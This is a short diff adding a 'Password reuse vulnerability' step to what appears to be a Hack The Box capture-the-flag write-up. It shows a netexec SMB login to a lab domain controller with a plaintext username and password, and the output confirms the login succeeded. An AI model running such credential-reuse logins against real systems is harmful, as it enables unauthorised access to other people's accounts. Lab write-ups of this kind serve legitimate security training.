@@ -401,3 +401,15 @@ sAMAccountName: Domain Users
 ╰─                                                                                                                   ─╯
 
 ```
+
+`Password reuse vulnerability`
+
+``` bash
+
+❯ netexec smb 10.129.83.74 -u 'mark.davies' -p 'Checkpoint2024!'
+SMB         10.129.83.74    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
+SMB         10.129.83.74    445    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024!
+╭─ ~/hacking/ctf/htb/medium/checkpoint/recon                                                                       ✔ ─╮
+╰─                                                                                                                   ─╯
+
+```
